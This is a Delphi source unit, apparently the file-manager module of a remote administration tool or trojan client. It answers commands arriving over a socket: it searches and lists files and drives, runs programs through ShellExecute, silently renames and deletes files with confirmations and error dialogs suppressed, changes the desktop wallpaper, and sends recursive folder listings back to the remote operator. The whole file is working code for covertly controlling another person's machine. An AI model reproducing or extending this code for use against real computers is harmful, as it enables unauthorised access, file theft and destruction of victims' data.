unit UnitFileSearch;

interface

uses
  applicationunit,windows,socketunit, unitshareddata, CompressionStreamUnit,ShlObj,ShFolder,
    ShellAPi, ImageHlp;

type
  TFileSearchRec = record
    FindData: TWIN32FindData;
    Path: string[255];
  end;

  TSearchOptions = record
    Path: string[255];
    FileName: string[255];
    Filter: string[255];
    SubDirs: bool;
    Fuzzy: bool;
  end;

  TSearchPointer = class
    SearchOptions: TSearchOptions;
    Socket: TClientSocket;
  end;


procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'FileSearch|' + Data);
end;

function LeftStr(Text : String ; Num : Integer): String ;
begin
  Result := Copy(Text,0,Num);
end;

function RightStr(Text : String ; Num : Integer): String ;
begin
   Result := Copy(Text,length(Text)+1 -Num,Num);
end;

function IncludeTrailingBackslash(Path: string): string;
begin
  Result := Path;
  if RightStr(Path,1) <> '\' then Result := Result + '\';
end;

function UpperCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

procedure SearchForFile(Socket: TClientSocket; Path: string; Filter:string; Data: string; Recurse: bool; Fuzzy: bool);
var
  FindData: TWIN32FindData;
  hFind: THandle;
  Stream: TMemoryStream;
  FileRec: TFileSearchRec;
  d: string;
begin
  if not Socket.Connected then exit;
  if Socket.Tag = 0 then exit;
  Sleep(10);

  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + Filter), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  Stream := TMemoryStream.Create;

  //if FindData.dwFileAttributes and $00000010 = 0 then begin
    if (pos(uppercase(Data),UpperCase(FindData.cFileName)) > 0) or (Data = '*') then begin
      FileRec.FindData := FindData;
      FileRec.Path := Path;
      Stream.Write(FileRec,SizeOf(TFileSearchRec));
    end;
  //end;

  while FindNextFile(hFind, FindData) do begin
    //if FindData.dwFileAttributes and $00000010 = 0 then begin
      if (pos(uppercase(Data),UpperCase(FindData.cFileName)) > 0) or (Data = '*') then begin
        FileRec.FindData := FindData;
        FileRec.Path := Path;
        Stream.Write(FileRec,SizeOf(TFileSearchRec));
      end;
    //end;
  end;

  if Stream.Size > 0 then begin
    SetString(d,pchar(Stream.memory),Stream.size);
    SendData(Socket,'Files|' + d);
  end;
  Stream.Free;
  Windows.FindClose(hFind);

  hFind := FindFirstFile(pchar(Path + Filter), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  if FindData.dwFileAttributes and $00000010 = 0 then begin
  end else begin
    if (FindData.cFileName <> string('.')) and (FindData.cFileName <> string('..')) then if recurse then SearchForFile(Socket,path + FindData.cFileName,Filter,Data,recurse,Fuzzy);
  end;

  while FindNextFile(hFind, FindData) do begin
    if FindData.dwFileAttributes and $00000010 = 0 then begin
    end else begin
      if (FindData.cFileName <> string('.')) and (FindData.cFileName <> string('..')) then if recurse then SearchForFile(Socket,path + FindData.cFileName,Filter,Data,recurse,Fuzzy);
    end;
  end;
  Windows.FindClose(hFind);

end;

procedure FileSearch(p: pointer); stdcall;
var
  SearchPointer: TSearchPointer;
begin
  SearchPointer := TSearchPointer(p);
  SearchForFile(SearchPointer.Socket,SearchPointer.SearchOptions.Path,SearchPointer.SearchOptions.Filter,SearchPointer.SearchOptions.FileName,SearchPointer.SearchOptions.SubDirs,SearchPointer.SearchOptions.Fuzzy);
  SendData(SearchPointer.Socket,'SearchComplete');
  SearchPointer.Free;
end;

function DriveSize(InSize: int64): string;
var
  Kb: int64;
  Mb: int64;
  Gb: int64;
begin
  result := '0';
  //if dType <> 2 then exit;
  if InSize = 0 then exit;
  Kb := InSize div 1024;
  Mb := Kb div 1024;
  Gb := Mb div 1024;
  Result := inttostr(Gb);
end;

function DriveList: string;
var
  BufferSize, ReturnSize: dword;
  PBuffer: PChar;
  Buffer: PChar;
  DriveType: integer;
  mysize,freesize,totalsize: int64;
begin
  Result := '';
  BufferSize := 1;
  GetMem(Buffer, BufferSize);
  ReturnSize := GetLogicalDriveStrings(BufferSize, Buffer);
  if ReturnSize > BufferSize then begin
    BufferSize := ReturnSize;
    ReallocMem(Buffer, BufferSize);
    GetLogicalDriveStrings(BufferSize, Buffer);
  end;
  PBuffer := Buffer;
  while PBuffer^ <> #0 do begin
    MySize := 0;
    Totalsize := 0;
    Freesize := 0;
    GetDiskFreeSpaceEx(PBuffer, MySize, Totalsize, @Freesize);
    DriveType := GetDriveType(PBuffer);
    Result := Result + PBuffer + '|' + inttostr(DriveType) + '|';
    Inc(PBuffer,4);
  end;
end;

function GetAttrib(FindData: TWIN32FindData):string;
begin
  if FindData.dwFileAttributes and $00000010 <> 0 then begin
    Result := 'File Folder';
  end else begin
    if FindData.dwFileAttributes and $00000020 <> 0 then Result := Result + 'A';
    if FindData.dwFileAttributes and $00000002 <> 0 then Result := Result + 'H';
    if FindData.dwFileAttributes and $00000001 <> 0 then Result := Result + 'R';
    if FindData.dwFileAttributes and $00000004 <> 0 then Result := Result + 'S';
  end;
end;

procedure FolderList(Stream: TMemoryStream; path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;
  if GetAttrib(FindData) = 'File Folder' then Stream.WriteBuffer(FindData,SizeOf(TWIN32FindData));
  while FindNextFile(hFind, FindData) do begin
    if GetAttrib(FindData) = 'File Folder' then Stream.WriteBuffer(FindData,SizeOf(TWIN32FindData));
  end;
  FindClose(hFind);
end;

function SearchAndReplace(sSrc, sLookFor, sReplaceWith : string) : string;
var
   nPos, nLenLookFor : integer;
begin
   nPos := Pos(sLookFor, sSrc);
   nLenLookFor := Length(sLookFor) ;
   while (nPos > 0) do begin
     Delete(sSrc, nPos, nLenLookFor) ;
     Insert(sReplaceWith, sSrc, nPos) ;
     nPos := Pos(sLookFor, sSrc) ;
   end;
   Result := sSrc;
end;

function WinDir: string;
var
  Buf: array [0..255] of Char;
begin
  GetWindowsDirectory(Buf,255);
  Result := Buf + string('\');
end;

function SysDir: string;
var
  Buf: array [0..255] of Char;
begin
  GetSystemDirectory(Buf,255);
  Result := Buf + string('\');
end;

function TempDir: string;
var
  Buf: array [0..255] of Char;
begin
  GetTempPath(255,Buf);
  Result := Buf;
end;

function GetSpecialFolder(const CSIDL : integer) : string;
var
  RecPath: array[0..255] of char;
begin
  result := '';
  if SHGetSpecialFolderPath(0,RecPath,CSIDL,false) then result := IncludeTrailingBackslash(RecPath);
end;


function ParsePath(Data: string): string;
begin
  if Pos('%ROOT%',Data) > 0 then Data := SearchAndReplace(Data,'%ROOT%',Copy(Windir,1,3));
  if Pos('%DESKTOP%',Data) > 0 then Data := SearchAndReplace(Data,'%DESKTOP%',GetSpecialFolder(CSIDL_DESKTOP));
  if Pos('%MYDOCUMENTS%',Data) > 0 then Data := SearchAndReplace(Data,'%MYDOCUMENTS%',GetSpecialFolder(CSIDL_PERSONAL));

  //if Pos('%WINDOWS%',Data) > 0 then Data := SearchAndReplace(Data,'%WINDOWS%',Windir);
  //if Pos('%SYSTEM%',Data) > 0 then Data := SearchAndReplace(Data,'%SYSTEM%',SysDir);
  //if Pos('%TEMP%',Data) > 0 then Data := SearchAndReplace(Data,'%TEMP%',TempDir);
  //if Pos('%APPLICATIONDATA%',Data) > 0 then Data := SearchAndReplace(Data,'%APPLICATIONDATA%',GetSpecialFolder(CSIDL_LOCAL_APPDATA));
  //if Pos('%MYPICTURES%',Data) > 0 then Data := SearchAndReplace(Data,'%MYPICTURES%',GetSpecialFolder(CSIDL_MYPICTURES));
  {if Pos('%PROGRAMS%',Data) > 0 then Data := SearchAndReplace(Data,'%PROGRAMS%',GetSpecialFolder(CSIDL_PROGRAMS));
  if Pos('%RECENTFILES%',Data) > 0 then Data := SearchAndReplace(Data,'%RECENTFILES%',GetSpecialFolder(CSIDL_RECENT));
  if Pos('%SENDTO%',Data) > 0 then Data := SearchAndReplace(Data,'%SENDTO%',GetSpecialFolder(CSIDL_SENDTO));
  if Pos('%STARTMENU%',Data) > 0 then Data := SearchAndReplace(Data,'%STARTMENU%',GetSpecialFolder(CSIDL_STARTMENU));
  if Pos('%STARTUP%',Data) > 0 then Data := SearchAndReplace(Data,'%STARTUP%',GetSpecialFolder(CSIDL_STARTUP));
  if Pos('%COOKIES%',Data) > 0 then Data := SearchAndReplace(Data,'%COOKIES%',GetSpecialFolder(CSIDL_COOKIES));
  if Pos('%PROGRAMFILES%',Data) > 0 then Data := SearchAndReplace(Data,'%PROGRAMFILES%',GetSpecialFolder(CSIDL_PROGRAM_FILES));
  }
  result := Data;
end;

procedure FileList(Stream: TMemoryStream; path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;
  if GetAttrib(FindData) <> 'File Folder' then Stream.WriteBuffer(FindData,SizeOf(TWIN32FindData));
  while FindNextFile(hFind, FindData) do begin
    if GetAttrib(FindData) <> 'File Folder' then Stream.WriteBuffer(FindData,SizeOf(TWIN32FindData));
  end;
  FindClose(hFind);
end;

function GetList(Path: string; Files: bool): string;
var
  Stream: TMemoryStream;
begin
  Path := ParsePath(Path);
  Stream := TMemoryStream.Create;
  if Files then FileList(Stream,Path) else FolderList(Stream,Path);
  SetString(Result, PChar(Stream.Memory), Stream.Size);
  Stream.Free;
end;

function RenameFile(OldPath:string; NewPath: string): string;
var
  fos: TSHFileOpStruct;
begin
  Result := 'Error Renaming File: ' + OldPath + ' To ' + NewPath;
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_MOVE;
    fFlags := FOF_FILESONLY + FOF_SILENT + FOF_NOCONFIRMATION + FOF_NOERRORUI;
    pFrom := PChar(OldPath + #0);
    pTo := PChar(NewPath)
  end;
  if (0 = ShFileOperation(fos)) then Result := 'Renamed File: ' + OldPath + ' To ' + NewPath;
end;

function DeleteDirectory(dir: string): string;
var
  fos: TSHFileOpStruct;
begin
  Result := 'Error Deleting File: ' + dir;
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_DELETE;
    fFlags := FOF_SILENT + FOF_NOCONFIRMATION + FOF_NOERRORUI;
    pFrom := PChar(dir + #0);
  end;
  if (0 = ShFileOperation(fos)) then Result := 'Deleted File: ' + dir;
end;

function FileDeleteRB(dir:string): string;
var
  fos: TSHFileOpStruct;
begin
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_DELETE;
    fFlags := FOF_SILENT + FOF_NOCONFIRMATION + FOF_NOERRORUI + FOF_ALLOWUNDO;
    pFrom := PChar(dir + #0);
  end;
end;

procedure FileListRecursive(Stream: TMemoryStream; path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
  FileSearchRec: TFileSearchRec;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  if GetAttrib(FindData) <> 'File Folder' then begin
    FileSearchRec.Path := Path;
    FileSearchRec.FindData := FindData;
    Stream.WriteBuffer(FileSearchRec,SizeOf(TFileSearchRec));
  end else begin
    if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FileListRecursive(Stream,Path + FindData.cFileName);
  end;

  while FindNextFile(hFind, FindData) do begin
    if GetAttrib(FindData) <> 'File Folder' then begin
      FileSearchRec.Path := Path;
      FileSearchRec.FindData := FindData;
      Stream.WriteBuffer(FileSearchRec,SizeOf(TFileSearchRec));
    end else begin
      if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FileListRecursive(Stream,Path + FindData.cFileName);
    end;
  end;

  FindClose(hFind);
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  SearchOptions: TSearchOptions;
  SearchPointer: TSearchPointer;
  Thr: dword;
  Path: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Search' then begin
    Socket.Tag := 1;
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,Length(Data));
    Stream.Position := 0;
    Stream.Read(SearchOptions,SizeOf(TSearchOptions));
    Stream.Free;
    SearchPointer := TSearchPointer.Create;
    SearchPointer.Socket := Socket;
    SearchPointer.SearchOptions := SearchOptions;
    CreateThread(nil,0,@FileSearch,pointer(SearchPointer),0,Thr);
  end;

  if Command = 'StopSearch' then begin
    Socket.Tag := 0;
    SendData(Socket,'SearchComplete');
  end;

  if Command = 'DriveList' then begin
    SendData(Socket,Command + '|' + DriveList);
    //SendData(Socket,'FolderList' + '|' + ParsePath('%ROOT%') + '|' + GetList(ParsePath('%ROOT%'),False));
  end;

  if Command = 'FileList' then begin
    SendData(Socket,'FolderList' + '|' + ParsePath(Data) + '|' + GetList(ParsePath(Data),False));
    //SendData(Socket,'FileList' + '|' + GetList(ParsePath(Data),True));
  end;

    if Command = 'Execute' then begin
    ShellExecute(0,'open',pchar(split(Data,'|',1)),pchar(split(Data,'|',2)),'',strtoint(split(Data,'|',3)));
  end;

  if Command = 'Rename' then begin
    RenameFile(split(Data,'|',1),split(Data,'|',2));
  end;

    if Command = 'Delete' then begin
    DeleteDirectory(Data);
  end;

  if Command = 'Recycle' then begin
    FileDeleteRB(Data);
  end;

  if Command = 'SetWallpaper' then begin
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, pchar(Data), SPIF_SENDCHANGE);
  end;

  if Command = 'DownloadFolder' then begin
    Path := ParsePath(Data);
    Stream := TMemoryStream.Create;
    FileListRecursive(Stream,Path);
    SetString(Data, PChar(Stream.Memory), Stream.Size);
    Stream.Free;
    SendData(Socket,Command + '|' + Data);
  end;

end;


end.
